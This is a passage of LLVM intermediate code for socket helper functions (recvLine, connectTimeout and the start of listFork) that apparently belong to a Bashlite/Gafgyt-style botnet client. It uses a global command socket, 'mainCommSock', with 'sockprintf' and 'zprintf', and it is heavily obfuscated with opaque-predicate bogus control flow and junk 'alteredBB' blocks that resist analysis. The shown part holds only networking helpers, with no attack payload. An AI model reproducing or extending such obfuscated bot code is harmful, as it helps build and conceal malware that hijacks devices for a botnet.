define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = load i32, i32* @x.43
  %26 = load i32, i32* @y.44
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %24
  %33 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %34 = getelementptr inbounds [16 x i64], [16 x i64]* %33, i64 0, i64 0
  %35 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %34) #4, !srcloc !1
  %36 = extractvalue { i64, i64* } %35, 0
  %37 = extractvalue { i64, i64* } %35, 1
  %38 = trunc i64 %36 to i32
  store i32 %38, i32* %10, align 4
  %39 = ptrtoint i64* %37 to i64
  %40 = trunc i64 %39 to i32
  store i32 %40, i32* %11, align 4
  %41 = load i32, i32* @x.43
  %42 = load i32, i32* @y.44
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %49

; <label>:49:                                     ; preds = %originalBBpart2
  %50 = load i32, i32* @x.43
  %51 = load i32, i32* @y.44
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %49
  %58 = load i32, i32* %5, align 4
  %59 = srem i32 %58, 64
  %60 = zext i32 %59 to i64
  %61 = shl i64 1, %60
  %62 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %63 = load i32, i32* %5, align 4
  %64 = sdiv i32 %63, 64
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds [16 x i64], [16 x i64]* %62, i64 0, i64 %65
  %67 = load i64, i64* %66, align 8
  %68 = or i64 %67, %61
  store i64 %68, i64* %66, align 8
  %69 = load i32, i32* %5, align 4
  %70 = add nsw i32 %69, 1
  %71 = call i32 @select(i32 %70, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %71, i32* %12, align 4
  %72 = icmp sle i32 %71, 0
  %73 = load i32, i32* @x.43
  %74 = load i32, i32* @y.44
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBBpart236, label %originalBB1alteredBB

originalBBpart236:                                ; preds = %originalBB1
  br i1 %72, label %81, label %152

; <label>:81:                                     ; preds = %originalBBpart236
  br label %82

; <label>:82:                                     ; preds = %originalBBpart247, %81
  %83 = load i32, i32* %13, align 4
  %84 = icmp slt i32 %83, 10
  br i1 %84, label %85, label %151

; <label>:85:                                     ; preds = %82
  %86 = load i32, i32* @mainCommSock, align 4
  %87 = call i32 (i32, i8*, ...) @sockprintf(i32 %86, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0))
  %88 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %88, align 8
  %89 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %89, align 8
  br label %90

; <label>:90:                                     ; preds = %85
  %91 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %92 = getelementptr inbounds [16 x i64], [16 x i64]* %91, i64 0, i64 0
  %93 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %92) #4, !srcloc !2
  %94 = extractvalue { i64, i64* } %93, 0
  %95 = extractvalue { i64, i64* } %93, 1
  %96 = trunc i64 %94 to i32
  store i32 %96, i32* %14, align 4
  %97 = ptrtoint i64* %95 to i64
  %98 = trunc i64 %97 to i32
  store i32 %98, i32* %15, align 4
  br label %99

; <label>:99:                                     ; preds = %90
  %100 = load i32, i32* %5, align 4
  %101 = srem i32 %100, 64
  %102 = zext i32 %101 to i64
  %103 = shl i64 1, %102
  %104 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %105 = load i32, i32* %5, align 4
  %106 = sdiv i32 %105, 64
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds [16 x i64], [16 x i64]* %104, i64 0, i64 %107
  %109 = load i64, i64* %108, align 8
  %110 = or i64 %109, %103
  store i64 %110, i64* %108, align 8
  %111 = load i32, i32* %5, align 4
  %112 = add nsw i32 %111, 1
  %113 = call i32 @select(i32 %112, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %113, i32* %12, align 4
  %114 = icmp sle i32 %113, 0
  br i1 %114, label %115, label %134

; <label>:115:                                    ; preds = %99
  %116 = load i32, i32* @x.43
  %117 = load i32, i32* @y.44
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %115
  %124 = load i32, i32* %13, align 4
  %125 = add nsw i32 %124, 1
  store i32 %125, i32* %13, align 4
  %126 = load i32, i32* @x.43
  %127 = load i32, i32* @y.44
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBBpart247, label %originalBB38alteredBB

originalBBpart247:                                ; preds = %originalBB38
  br label %82

; <label>:134:                                    ; preds = %99
  %135 = load i32, i32* @x.43
  %136 = load i32, i32* @y.44
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %134
  %143 = load i32, i32* @x.43
  %144 = load i32, i32* @y.44
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br label %151

; <label>:151:                                    ; preds = %originalBBpart251, %82
  br label %152

; <label>:152:                                    ; preds = %151, %originalBBpart236
  %153 = load i32, i32* @x.43
  %154 = load i32, i32* @y.44
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %152
  store i32 0, i32* %18, align 4
  %161 = load i8*, i8** %6, align 8
  store i8* %161, i8** %17, align 8
  %162 = load i32, i32* @x.43
  %163 = load i32, i32* @y.44
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br label %170

; <label>:170:                                    ; preds = %originalBBpart272, %originalBBpart255
  %171 = load i32, i32* @x.43
  %172 = load i32, i32* @y.44
  %173 = sub i32 %171, 1
  %174 = mul i32 %171, %173
  %175 = urem i32 %174, 2
  %176 = icmp eq i32 %175, 0
  %177 = icmp slt i32 %172, 10
  %178 = or i1 %176, %177
  br i1 %178, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %170
  %179 = load i32, i32* %7, align 4
  %180 = add nsw i32 %179, -1
  store i32 %180, i32* %7, align 4
  %181 = icmp sgt i32 %179, 1
  %182 = load i32, i32* @x.43
  %183 = load i32, i32* @y.44
  %184 = sub i32 %182, 1
  %185 = mul i32 %182, %184
  %186 = urem i32 %185, 2
  %187 = icmp eq i32 %186, 0
  %188 = icmp slt i32 %183, 10
  %189 = or i1 %187, %188
  br i1 %189, label %originalBBpart260, label %originalBB57alteredBB

originalBBpart260:                                ; preds = %originalBB57
  br i1 %181, label %190, label %255

; <label>:190:                                    ; preds = %originalBBpart260
  %191 = load i32, i32* @mainCommSock, align 4
  %192 = call i64 @recv(i32 %191, i8* %16, i64 1, i32 0)
  %193 = icmp ne i64 %192, 1
  br i1 %193, label %194, label %212

; <label>:194:                                    ; preds = %190
  %195 = load i32, i32* @x.43
  %196 = load i32, i32* @y.44
  %197 = sub i32 %195, 1
  %198 = mul i32 %195, %197
  %199 = urem i32 %198, 2
  %200 = icmp eq i32 %199, 0
  %201 = icmp slt i32 %196, 10
  %202 = or i1 %200, %201
  br i1 %202, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %194
  %203 = load i8*, i8** %17, align 8
  store i8 0, i8* %203, align 1
  store i32 -1, i32* %4, align 4
  %204 = load i32, i32* @x.43
  %205 = load i32, i32* @y.44
  %206 = sub i32 %204, 1
  %207 = mul i32 %204, %206
  %208 = urem i32 %207, 2
  %209 = icmp eq i32 %208, 0
  %210 = icmp slt i32 %205, 10
  %211 = or i1 %209, %210
  br i1 %211, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br label %276

; <label>:212:                                    ; preds = %190
  %213 = load i32, i32* @x.43
  %214 = load i32, i32* @y.44
  %215 = sub i32 %213, 1
  %216 = mul i32 %213, %215
  %217 = urem i32 %216, 2
  %218 = icmp eq i32 %217, 0
  %219 = icmp slt i32 %214, 10
  %220 = or i1 %218, %219
  br i1 %220, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %212
  %221 = load i8, i8* %16, align 1
  %222 = load i8*, i8** %17, align 8
  %223 = getelementptr inbounds i8, i8* %222, i32 1
  store i8* %223, i8** %17, align 8
  store i8 %221, i8* %222, align 1
  %224 = load i8, i8* %16, align 1
  %225 = zext i8 %224 to i32
  %226 = icmp eq i32 %225, 10
  %227 = load i32, i32* @x.43
  %228 = load i32, i32* @y.44
  %229 = sub i32 %227, 1
  %230 = mul i32 %227, %229
  %231 = urem i32 %230, 2
  %232 = icmp eq i32 %231, 0
  %233 = icmp slt i32 %228, 10
  %234 = or i1 %232, %233
  br i1 %234, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %226, label %235, label %236

; <label>:235:                                    ; preds = %originalBBpart268
  br label %255

; <label>:236:                                    ; preds = %originalBBpart268
  %237 = load i32, i32* @x.43
  %238 = load i32, i32* @y.44
  %239 = sub i32 %237, 1
  %240 = mul i32 %237, %239
  %241 = urem i32 %240, 2
  %242 = icmp eq i32 %241, 0
  %243 = icmp slt i32 %238, 10
  %244 = or i1 %242, %243
  br i1 %244, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %236
  %245 = load i32, i32* %18, align 4
  %246 = add nsw i32 %245, 1
  store i32 %246, i32* %18, align 4
  %247 = load i32, i32* @x.43
  %248 = load i32, i32* @y.44
  %249 = sub i32 %247, 1
  %250 = mul i32 %247, %249
  %251 = urem i32 %250, 2
  %252 = icmp eq i32 %251, 0
  %253 = icmp slt i32 %248, 10
  %254 = or i1 %252, %253
  br i1 %254, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br label %170

; <label>:255:                                    ; preds = %235, %originalBBpart260
  %256 = load i32, i32* @x.43
  %257 = load i32, i32* @y.44
  %258 = sub i32 %256, 1
  %259 = mul i32 %256, %258
  %260 = urem i32 %259, 2
  %261 = icmp eq i32 %260, 0
  %262 = icmp slt i32 %257, 10
  %263 = or i1 %261, %262
  br i1 %263, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %255
  %264 = load i8*, i8** %17, align 8
  store i8 0, i8* %264, align 1
  %265 = load i8*, i8** %17, align 8
  %266 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.22, i32 0, i32 0), i8* %265)
  %267 = load i32, i32* %18, align 4
  store i32 %267, i32* %4, align 4
  %268 = load i32, i32* @x.43
  %269 = load i32, i32* @y.44
  %270 = sub i32 %268, 1
  %271 = mul i32 %268, %270
  %272 = urem i32 %271, 2
  %273 = icmp eq i32 %272, 0
  %274 = icmp slt i32 %269, 10
  %275 = or i1 %273, %274
  br i1 %275, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br label %276

; <label>:276:                                    ; preds = %originalBBpart276, %originalBBpart264
  %277 = load i32, i32* %4, align 4
  ret i32 %277

originalBBalteredBB:                              ; preds = %originalBB, %24
  %278 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %279 = getelementptr inbounds [16 x i64], [16 x i64]* %278, i64 0, i64 0
  %280 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %279) #4, !srcloc !1
  %281 = extractvalue { i64, i64* } %280, 0
  %282 = extractvalue { i64, i64* } %280, 1
  %283 = trunc i64 %281 to i32
  store i32 %283, i32* %10, align 4
  %284 = ptrtoint i64* %282 to i64
  %285 = trunc i64 %284 to i32
  store i32 %285, i32* %11, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %49
  %286 = load i32, i32* %5, align 4
  %_ = shl i32 %286, 64
  %_2 = sub i32 %286, 64
  %gen = mul i32 %_2, 64
  %_3 = sub i32 %286, 64
  %gen4 = mul i32 %_3, 64
  %_5 = shl i32 %286, 64
  %_6 = sub i32 0, %286
  %gen7 = add i32 %_6, 64
  %_8 = sub i32 0, %286
  %gen9 = add i32 %_8, 64
  %_10 = shl i32 %286, 64
  %287 = srem i32 %286, 64
  %288 = zext i32 %287 to i64
  %_11 = sub i64 1, %288
  %gen12 = mul i64 %_11, %288
  %_13 = shl i64 1, %288
  %_14 = shl i64 1, %288
  %_15 = shl i64 1, %288
  %289 = shl i64 1, %288
  %290 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %291 = load i32, i32* %5, align 4
  %_16 = sub i32 %291, 64
  %gen17 = mul i32 %_16, 64
  %_18 = shl i32 %291, 64
  %_19 = shl i32 %291, 64
  %292 = sdiv i32 %291, 64
  %293 = sext i32 %292 to i64
  %294 = getelementptr inbounds [16 x i64], [16 x i64]* %290, i64 0, i64 %293
  %295 = load i64, i64* %294, align 8
  %_20 = sub i64 %295, %289
  %gen21 = mul i64 %_20, %289
  %_22 = sub i64 0, %295
  %gen23 = add i64 %_22, %289
  %_24 = sub i64 %295, %289
  %gen25 = mul i64 %_24, %289
  %296 = or i64 %295, %289
  store i64 %296, i64* %294, align 8
  %297 = load i32, i32* %5, align 4
  %_26 = sub i32 0, %297
  %gen27 = add i32 %_26, 1
  %_28 = sub i32 0, %297
  %gen29 = add i32 %_28, 1
  %_30 = shl i32 %297, 1
  %_31 = shl i32 %297, 1
  %_32 = sub i32 %297, 1
  %gen33 = mul i32 %_32, 1
  %_34 = shl i32 %297, 1
  %298 = add nsw i32 %297, 1
  %299 = call i32 @select(i32 %298, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %299, i32* %12, align 4
  %300 = icmp sle i32 %299, 0
  br label %originalBB1

originalBB38alteredBB:                            ; preds = %originalBB38, %115
  %301 = load i32, i32* %13, align 4
  %_39 = shl i32 %301, 1
  %_40 = sub i32 %301, 1
  %gen41 = mul i32 %_40, 1
  %_42 = sub i32 0, %301
  %gen43 = add i32 %_42, 1
  %_44 = shl i32 %301, 1
  %_45 = shl i32 %301, 1
  %302 = add nsw i32 %301, 1
  store i32 %302, i32* %13, align 4
  br label %originalBB38

originalBB49alteredBB:                            ; preds = %originalBB49, %134
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %152
  store i32 0, i32* %18, align 4
  %303 = load i8*, i8** %6, align 8
  store i8* %303, i8** %17, align 8
  br label %originalBB53

originalBB57alteredBB:                            ; preds = %originalBB57, %170
  %304 = load i32, i32* %7, align 4
  %_58 = shl i32 %304, -1
  %305 = add nsw i32 %304, -1
  store i32 %305, i32* %7, align 4
  %306 = icmp sgt i32 %304, 1
  br label %originalBB57

originalBB62alteredBB:                            ; preds = %originalBB62, %194
  %307 = load i8*, i8** %17, align 8
  store i8 0, i8* %307, align 1
  store i32 -1, i32* %4, align 4
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %212
  %308 = load i8, i8* %16, align 1
  %309 = load i8*, i8** %17, align 8
  %310 = getelementptr inbounds i8, i8* %309, i32 1
  store i8* %310, i8** %17, align 8
  store i8 %308, i8* %309, align 1
  %311 = load i8, i8* %16, align 1
  %312 = zext i8 %311 to i32
  %313 = icmp eq i32 %312, 10
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %236
  %314 = load i32, i32* %18, align 4
  %315 = add nsw i32 %314, 1
  store i32 %315, i32* %18, align 4
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %255
  %316 = load i8*, i8** %17, align 8
  store i8 0, i8* %316, align 1
  %317 = load i8*, i8** %17, align 8
  %318 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.22, i32 0, i32 0), i8* %317)
  %319 = load i32, i32* %18, align 4
  store i32 %319, i32* %4, align 4
  br label %originalBB74
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #5

declare i64 @recv(i32, i8*, i64, i32) #5

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %132

; <label>:37:                                     ; preds = %4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 8, i32 4, i1 false)
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %16, align 4
  %43 = load i32, i32* %16, align 4
  %44 = icmp slt i32 %43, 0
  br i1 %44, label %45, label %123

; <label>:45:                                     ; preds = %37
  %46 = call i32* @__errno_location() #13
  %47 = load i32, i32* %46, align 4
  %48 = icmp eq i32 %47, 115
  br i1 %48, label %49, label %121

; <label>:49:                                     ; preds = %45
  %50 = load i32, i32* @x.45
  %51 = load i32, i32* @y.46
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %49
  %58 = load i32, i32* %9, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %59, i64* %60, align 8
  %61 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %61, align 8
  %62 = load i32, i32* @x.45
  %63 = load i32, i32* @y.46
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %70

; <label>:70:                                     ; preds = %originalBBpart2
  %71 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %72 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 0
  %73 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %72) #4, !srcloc !3
  %74 = extractvalue { i64, i64* } %73, 0
  %75 = extractvalue { i64, i64* } %73, 1
  %76 = trunc i64 %74 to i32
  store i32 %76, i32* %17, align 4
  %77 = ptrtoint i64* %75 to i64
  %78 = trunc i64 %77 to i32
  store i32 %78, i32* %18, align 4
  br label %79

; <label>:79:                                     ; preds = %70
  %80 = load i32, i32* @x.45
  %81 = load i32, i32* @y.46
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %79
  %88 = load i32, i32* %6, align 4
  %89 = srem i32 %88, 64
  %90 = zext i32 %89 to i64
  %91 = shl i64 1, %90
  %92 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %93 = load i32, i32* %6, align 4
  %94 = sdiv i32 %93, 64
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds [16 x i64], [16 x i64]* %92, i64 0, i64 %95
  %97 = load i64, i64* %96, align 8
  %98 = or i64 %97, %91
  store i64 %98, i64* %96, align 8
  %99 = load i32, i32* %6, align 4
  %100 = add nsw i32 %99, 1
  %101 = call i32 @select(i32 %100, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %102 = icmp sgt i32 %101, 0
  %103 = load i32, i32* @x.45
  %104 = load i32, i32* @y.46
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart222, label %originalBB1alteredBB

originalBBpart222:                                ; preds = %originalBB1
  br i1 %102, label %111, label %119

; <label>:111:                                    ; preds = %originalBBpart222
  store i32 4, i32* %13, align 4
  %112 = load i32, i32* %6, align 4
  %113 = bitcast i32* %14 to i8*
  %114 = call i32 @getsockopt(i32 %112, i32 1, i32 4, i8* %113, i32* %13) #4
  %115 = load i32, i32* %14, align 4
  %116 = icmp ne i32 %115, 0
  br i1 %116, label %117, label %118

; <label>:117:                                    ; preds = %111
  store i32 0, i32* %5, align 4
  br label %132

; <label>:118:                                    ; preds = %111
  br label %120

; <label>:119:                                    ; preds = %originalBBpart222
  store i32 0, i32* %5, align 4
  br label %132

; <label>:120:                                    ; preds = %118
  br label %122

; <label>:121:                                    ; preds = %45
  store i32 0, i32* %5, align 4
  br label %132

; <label>:122:                                    ; preds = %120
  br label %123

; <label>:123:                                    ; preds = %122, %37
  %124 = load i32, i32* %6, align 4
  %125 = call i32 (i32, i32, ...) @fcntl(i32 %124, i32 3, i8* null)
  %126 = sext i32 %125 to i64
  store i64 %126, i64* %15, align 8
  %127 = load i64, i64* %15, align 8
  %128 = and i64 %127, -2049
  store i64 %128, i64* %15, align 8
  %129 = load i32, i32* %6, align 4
  %130 = load i64, i64* %15, align 8
  %131 = call i32 (i32, i32, ...) @fcntl(i32 %129, i32 4, i64 %130)
  store i32 1, i32* %5, align 4
  br label %132

; <label>:132:                                    ; preds = %123, %121, %119, %117, %36
  %133 = load i32, i32* %5, align 4
  ret i32 %133

originalBBalteredBB:                              ; preds = %originalBB, %49
  %134 = load i32, i32* %9, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %135, i64* %136, align 8
  %137 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %137, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %79
  %138 = load i32, i32* %6, align 4
  %_ = sub i32 0, %138
  %gen = add i32 %_, 64
  %_2 = sub i32 %138, 64
  %gen3 = mul i32 %_2, 64
  %_4 = shl i32 %138, 64
  %139 = srem i32 %138, 64
  %140 = zext i32 %139 to i64
  %_5 = sub i64 0, 1
  %gen6 = add i64 %_5, %140
  %141 = shl i64 1, %140
  %142 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %143 = load i32, i32* %6, align 4
  %_7 = sub i32 0, %143
  %gen8 = add i32 %_7, 64
  %_9 = shl i32 %143, 64
  %_10 = sub i32 0, %143
  %gen11 = add i32 %_10, 64
  %144 = sdiv i32 %143, 64
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds [16 x i64], [16 x i64]* %142, i64 0, i64 %145
  %147 = load i64, i64* %146, align 8
  %_12 = shl i64 %147, %141
  %148 = or i64 %147, %141
  store i64 %148, i64* %146, align 8
  %149 = load i32, i32* %6, align 4
  %_13 = shl i32 %149, 1
  %_14 = sub i32 %149, 1
  %gen15 = mul i32 %_14, 1
  %_16 = sub i32 0, %149
  %gen17 = add i32 %_16, 1
  %_18 = sub i32 0, %149
  %gen19 = add i32 %_18, 1
  %_20 = shl i32 %149, 1
  %150 = add nsw i32 %149, 1
  %151 = call i32 @select(i32 %150, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %152 = icmp sgt i32 %151, 0
  br label %originalBB1
}

declare i32 @fcntl(i32, i32, ...) #5

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #5

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
